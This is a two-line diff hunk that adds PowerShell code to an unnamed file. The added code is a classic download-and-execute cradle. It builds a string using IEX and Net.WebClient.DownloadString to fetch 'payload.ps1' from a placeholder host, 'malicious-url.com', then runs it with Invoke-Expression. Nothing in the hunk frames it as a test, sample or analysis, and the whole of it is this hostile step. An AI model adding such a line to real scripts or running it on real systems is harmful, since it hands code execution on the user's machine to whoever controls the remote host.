@@ -1,0 +1,2 @@
+$script = 'IEX (New-Object Net.WebClient).DownloadString("http://malicious-url.com/payload.ps1")'
+Invoke-Expression $script
